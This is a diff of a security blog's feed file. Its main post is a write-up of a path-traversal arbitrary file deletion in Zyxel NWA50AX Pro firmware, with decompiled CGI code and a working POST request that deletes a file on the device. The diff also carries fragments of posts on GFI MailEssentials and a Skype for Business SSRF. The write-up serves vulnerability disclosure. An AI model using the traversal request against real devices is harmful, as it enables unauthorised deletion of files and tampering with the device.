class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff9e58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acStack_2008&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s/%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_SlashTmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [7]&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acStack_2008&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [5]&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;rename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acStack_2008&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [6]&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;firmware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unlink&lt;/code&gt; call at [5] (basically a file delete) and a following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rename&lt;/code&gt; [5] had piqued my interest. In addition, at [7] my user-controlled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_path.filename&lt;/code&gt;
+query parameter was concatenated to a static path prefix via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. Smells like path traversal, doesn’t it? As indicated by my renamed variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAT_SlashTmp&lt;/code&gt;,
+this was a static value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;, probably enabling me to traverse out of the intended context: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/../../../im/a/hackerman&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation-success&quot;&gt;Exploitation Success&lt;/h1&gt;
+
+&lt;p&gt;Response error code debugging led me to the following POST request, hopefully deleting (thanks to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unlink&lt;/code&gt;) the logo PNG file used at the login page.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /cgi-bin/file_upload-cgi/images HTTP/1.1
+Host: TARGET
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 230
+
+file_path=/usr/local/zyxel-gui/htdocs/ext-js/web-pages/login/images/login_logo.png&amp;amp;nv=a&amp;amp;file_path.length=48&amp;amp;file_type=certlocal&amp;amp;vn=b&amp;amp;file_path.filename=../usr/local/zyxel-gui/htdocs/ext-js/web-pages/login/images/login_logo.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After firing the request, a direct comparison of the original login page&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/images/zyxel/zyxelbefore.png&quot; alt=&quot;Before&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;revealed a successful deletion.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/images/zyxel/zyxelafter.png&quot; alt=&quot;Before&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With an arbitrary file delete primitive alone, several further attacks should have been possible. Especially by abusing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rename&lt;/code&gt; call afterwards, this should
+give us another primitive of deleting a file and being replaced by, let’s say, a backup’d version (password file *cough*).&lt;/p&gt;
+
+&lt;h1 id=&quot;impact&quot;&gt;Impact&lt;/h1&gt;
+
+&lt;p&gt;Alright, we didn’t see any related CVEs in the last years for &lt;strong&gt;this special device&lt;/strong&gt; but could I find them on the public internet as well?
+Luckily, some were easily identified in no time. Vulnerable test as easy as sending a GET request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/file_upload-cgi/images&lt;/code&gt; with a response
+similar to the one mentioned above. The one in my apartment was vulnerable indeed, as were &amp;gt;80% of the 42 devices I found. I didn’t test the non-Pro version devices
+for which CensysIO returns over 200. But what about the Pro devices returning 400 instead?&lt;/p&gt;
+
+&lt;p&gt;Doing VR without following the standard methodologies might not had been my best idea, as it turned out. Searching for the 400 status code in Ghidra gave me this.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;LAB_00101784:&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_2808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DAT_00114260&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;script type=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;text/javascript&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;How did I hit this code then? At the very top of my main function, even before the deeply investigated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; branch which I successfully exploited a few minutes ago…&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VRDuringVacation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// iVar2 could be 6 :-P&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;// I want to get here!!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VRDuringVacation&lt;/code&gt; checked for auth cookies.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;__cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP_COOKIE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [8]&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;authtok=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [9]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strlcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_418&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_pton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_430&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uam_find_first_match&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auStack_3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http/https&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_430&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_418&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uam_find_first_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_pton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auStack_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LAB_00102338&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uam_find_first_match6&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auStack_3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http/https&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auStack_428&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_418&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uam_find_first_match6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LAB_0010233c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;LAB_00102338&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_277&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [10]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;LAB_0010233c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;___stack_chk_guard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_277&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// // [11]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It retrieved the cookie at [8], checked for the substring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authtok=&lt;/code&gt; [9], and set the return value to 6 [10] [11] eventually. I didn’t even check the implementations for
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uam_find_first_match&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uam_find_first_match6&lt;/code&gt; to realize that some patching had taken place on this latest version of the firmware.&lt;/p&gt;
+
+&lt;h1 id=&quot;sometimes-truth-hits-hard&quot;&gt;Sometimes Truth Hits Hard&lt;/h1&gt;
+
+&lt;p&gt;I had now spent four hours in the glorious night on these beautiful mountains analyzing this device. My Google-fu maybe wasn’t good enough.
+Indeed, after another half an hour an excellent Outpost24 blog post written by Timothy Hjort about &lt;a href=&quot;https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/&quot;&gt;“Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)”&lt;/a&gt; from June 2024 popped up. But wait…&lt;strong&gt;Zyxel NAS&lt;/strong&gt; devices? Of course, this excuse came in handy late at night.
+It was bit harder to infer from NAS to NWA50AX Pro vulnerabilities. I highly recommend everyone to read Timothy’s blog post and you’ll see that he also took some other approaches
+for his CVE-2024-29974 containing parts of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_upload-cgi&lt;/code&gt;. Even more interesting to read after my work was done.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h1&gt;
+
+&lt;p&gt;Vacation and VR combined? No such as great idea. BUT I’ve learnt a ton of new things and also found an nday variant because I’m not sure if there are any related publicly known
+vulnerabilities (e.g. CVEs) for all these affected &lt;strong&gt;Zyxel NWA50AX Pro&lt;/strong&gt; devices. Vendors with a large repertoire of products typically share large amount of code bases.
+This can lead to a lot of confusion for vulnerability management people, especially in our CVE-centric world.&lt;/p&gt;
+
+&lt;p&gt;This weekend, I’m going on another hiking trip, but my laptop(s) will stay at home.&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">Today was an eventful day thanks to many interesting blog posts, e.g. from my friends at watchTowr. So I thought, why not publish a small quick-and-dirty blog post myself about a story from last week? This blog post may not be of the usual quality, but it was a good time to write it.</summary></entry><entry><title type="html">GFI MailEssentials - Yet Another .NET Target</title><link href="http://localhost:4000/vulns4free/2025/04/28/mailessentials.html" rel="alternate" type="text/html" title="GFI MailEssentials - Yet Another .NET Target" /><published>2025-04-28T03:00:00+02:00</published><updated>2025-04-28T03:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2025/04/28/mailessentials</id><content type="html" xml:base="http://localhost:4000/vulns4free/2025/04/28/mailessentials.html">&lt;p&gt;What is this product &lt;em&gt;GFI MailEssentials&lt;/em&gt; all about? We’re living the future, right? So let’s ask the GFI AI.&lt;/p&gt;
 
 &lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/images/mailessentials/gfiblog_introduction.png&quot; alt=&quot;GFI MailEssentials Introduction&quot; /&gt;&lt;/p&gt;
 
@@ -4083,164 +4434,4 @@ Content-Type: application/json
 
 &lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
 
-&lt;p&gt;You might think: well, this was easy. Yeeesss, it was and everbody could have done it for sure. Use the tools and knowledge of all the bright people in infosec to help you through your journey of finding critical vulnerabilities. But please also have a deeper look into CodeQL first. From my experience, this was a total showcase, i.e. you might write your own queries and understand possible source APIs of your target application first before achieving any meaningful results. There exist some awesome workshops even with &lt;a href=&quot;https://youtu.be/-bJ2Ioi7Icg&quot;&gt;videos&lt;/a&gt; by the talented Alvaro Muñoz aka pwntester. I can also highly recommend the &lt;a href=&quot;https://youtu.be/nvCd0Ee4FgE&quot;&gt;workshop videos&lt;/a&gt; “Finding security vulnerabilities in Java with CodeQL”. There is so much more: search and profit!&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">This write-up won’t be an intense discussion on security code review techniques this time. We’ll simply let do all the hard work by a third party: CodeQL.</summary></entry><entry><title type="html">Skype for Business Audit Part 2 - SKYPErimeterleak</title><link href="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html" rel="alternate" type="text/html" title="Skype for Business Audit Part 2 - SKYPErimeterleak" /><published>2022-09-26T23:00:00+02:00</published><updated>2022-09-26T23:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html">&lt;blockquote&gt;
-  &lt;p&gt;Update 2023-10-10: After a year, Microsoft decided to provide a patch for this - &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-41763&quot;&gt;CVE-2023-41763&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;In my last &lt;a href=&quot;https://frycos.github.io/vulns4free/2022/09/22/skype-audit-part1.html&quot;&gt;blog post&lt;/a&gt; we talked about a new &lt;em&gt;persistence technique&lt;/em&gt; in &lt;strong&gt;Skype for Business 2019 (SfB)&lt;/strong&gt; found during my code audit. Now, I give a short code walk-through
-about an &lt;strong&gt;Pre-Auth Server-side Request Forgery (SSRF)&lt;/strong&gt; vulnerability which could easily lead to an internet perimeter breach.
-But let’s start from the beginning.&lt;/p&gt;
-
-&lt;p&gt;We still have the same setup, i.e. an Active Directory (AD) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONTOSO.COM&lt;/code&gt; with a SfB installation on a system &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SKYPE01&lt;/code&gt;.
-But this time, we’re looking for a vulnerability instead of a persistence technique for Red Teams.
-Since the &lt;a href=&quot;https://www.microsoft.com/en-us/msrc&quot;&gt;MSRC&lt;/a&gt; rejected my submission for this vulnerability with a “not meeting the bar” argument, I told them to publish a blog post instead.&lt;/p&gt;
-
-&lt;p&gt;We look again with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InetMgr.exe&lt;/code&gt; at the Application Pool and URI path configurations.&lt;/p&gt;
-
